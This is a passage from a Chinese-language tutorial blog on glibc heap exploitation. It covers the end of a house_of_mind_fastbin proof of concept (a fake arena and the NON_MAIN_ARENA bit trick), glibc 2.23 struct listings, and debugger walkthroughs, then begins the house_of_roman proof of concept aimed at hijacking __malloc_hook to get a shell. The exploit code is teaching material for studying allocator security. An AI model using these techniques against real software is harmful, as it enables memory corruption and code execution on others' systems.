class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size.</span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself.</span></span><br><span class="line"><span class="comment">	In 2.23, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is only 0x8. Then, fastbinsY[0x4] is an</span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x28 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs.</span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	<span class="built_in">assert</span>(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>2.23</code>版本和 <code>2.27</code> 以后间 <code>fastbinY[4]</code> 数组的偏移不同，<code>2.23</code> 为 <code>0x38</code> ，<code>2.27</code> 以后加入了 <code>have_fastchunks </code>，需要向后偏移 <code>0x8</code> 字节，即偏移为 <code>0x40</code>。<code>2.23</code> 的<code>malloc_state</code> 及 <code>_heap_info</code> 源码如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-15"><a href="#调试-15" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013162104393.png"
                      alt="image-20231013162104393"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013171006999.png"
                      alt="image-20231013171006999"
                ></p>
<p><code>target_loc</code> 位置在 <code>fake_arena_chunk + 0x30</code>  处，也就是 <code>fake_arena_fastbinY[4]</code> 处，因为我们要申请的 <code>fast_chunk</code> 大小为 <code>0x60</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013163308872.png"
                      alt="image-20231013163308872"
                ></p>
<p> <code>system_mem</code> 标识这个 <code>arena</code> 管理的空间大小，请求的内存不能大于 <code>system_mem</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013170335971.png"
                      alt="image-20231013170335971"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172604185.png"
                      alt="image-20231013172604185"
                ></p>
<p>在系统堆初始化之后，将堆的大小定为 <code>0x4000000</code>，因此后面申请的假 <code>arena</code> 管理的地址在这个堆之后，要计算这个堆的起始地址，程序中这个地址为 <code>0x4000000</code>。<code>MAX_SIZE</code> 大小为 <code>0x1ff00 &lt; 0x20000</code>  也就不会触发 <code>mmap</code> 申请机制。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172858520.png"
                      alt="image-20231013172858520"
                ></p>
<p>一直分配 <code>MAX_SIZE</code> 大小的 <code>chunk</code> 直到系统的 <code>main_heap</code> 被申请完。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173848951.png"
                      alt="image-20231013173848951"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173951000.png"
                      alt="image-20231013173951000"
                ></p>
<p>在新的堆区申请 <code>0x60</code> 大小的 <code>fast_chunk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013174809638.png"
                      alt="image-20231013174809638"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175009240.png"
                      alt="image-20231013175009240"
                ></p>
<p><code>fake_heap_info[0]==ar_ptr -&gt; fake_arena</code> 将 <code>ar_ptr</code> 指针指向我们的 <code>fake_arena</code>  ，<code>ar_ptr</code> 指针指向一个为该堆服务的<code>arena</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175140816.png"
                      alt="image-20231013175140816"
                ></p>
<p><code>fastbin_chunk_size = 0x60 | 0x4(0100B)</code> 将 <code>NON_MAIN_ARENA</code> 置为 <code>1</code> ，标明其不在主堆区。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175714934.png"
                      alt="image-20231013175714934"
                ></p>
<p><code>free(fastbin_chunk_fd)</code>  后，将会把它链接到 <code>fake_heap_info_ar_ptr</code> 指向 <code>fake_arena</code> 的 <code>fastbinY[4] (0x60)</code> 处，也就是 <code>0x603448</code> 处。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175937769.png"
                      alt="image-20231013175937769"
                ></p>
<p>此时完成利用成功将目标地址内容写为 <code>fastbin_chunk_prev_addr</code> 。</p>
<h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house_of_roman"></a>house_of_roman</h2><p><code>glibc &lt; 2.29</code></p>
<p>编译选项: <code>gcc -g house_of_roman.c -fpie -pie -ldl -o house_of_roman</code></p>
<p>除了 <code>libc-2.23.so</code> 和 <code>ld-2.23.so</code> 需要 <code>patch</code> 以外，还需要 <code>patch</code> 一下 <code>libdl-2.23.so</code></p>
<p><code>patchelf --replace-needed libdl.so.2 ./libdl-2.23.so house_of_roman</code></p>
<h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">	exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">	done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">	the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">	is done by creating a fastbin bin that looks like the following: </span></span><br><span class="line"><span class="comment">	ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment">	 (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">	(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">	the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">	inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">	value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">	However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">	brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment">	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">	pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">	over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(introduction);	</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*	</span></span><br><span class="line"><span class="comment">	Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">	This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">	However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">	a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">	Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">	All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">	above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">			- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">				gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">			- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">	requires less vulnerabilities.	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	</span></span><br><span class="line">	<span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line">	<span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line">	<span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Offset 0x100</span></span><br><span class="line">	<span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Offset 0x190</span></span><br><span class="line">	<span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line">	<span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line">	<span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line">	<span class="built_in">free</span>(main_arena_use);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">	We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">	contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">	chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment">	 a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line">	<span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line">	<span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line">	<span class="built_in">free</span>(relative_offset_heap);	</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/* </span></span><br><span class="line"><span class="comment">    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">	points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     	*/</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">	the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">	understand for this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Current heap layout: </span></span><br><span class="line"><span class="comment">	0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">	0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">	0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">	0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">	0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	bin layout: </span></span><br><span class="line"><span class="comment">			fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">			unsorted: leftover_main</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">	Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">	(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">	linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">	to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">	fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">	Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">	fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">	fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line">	